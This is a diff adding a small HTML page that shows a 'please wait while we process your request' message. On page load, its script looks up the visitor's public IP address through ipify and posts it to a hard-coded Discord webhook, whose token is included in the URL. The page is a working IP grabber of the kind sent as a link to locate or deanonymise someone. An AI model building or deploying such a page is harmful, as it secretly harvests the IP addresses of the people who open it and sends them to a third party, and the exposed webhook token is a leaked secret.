@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log IP Address</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Logging IP Address</h1>
+        <p>Please wait while we process your request...</p>
+    </div>
+    <script>
+        async function logIP() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Send the IP address to Discord webhook
+                await fetch('https://discord.com/api/webhooks/1399044837948391495/ZeRI1ikuBbMghEqn8cxmp8mWkkuDOl30JB4J10IEyoQo6bQfm5DWsqS330I0oF_Ccku9', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `User IP address logged: ${ip}`
+                    }),
+                });
+                
+                console.log('IP address sent:', ip);
+            } catch (error) {
+                console.error('Error logging IP address:', error);
+            }
+        }
+
+        logIP();
+    </script>
+</body>
+</html>
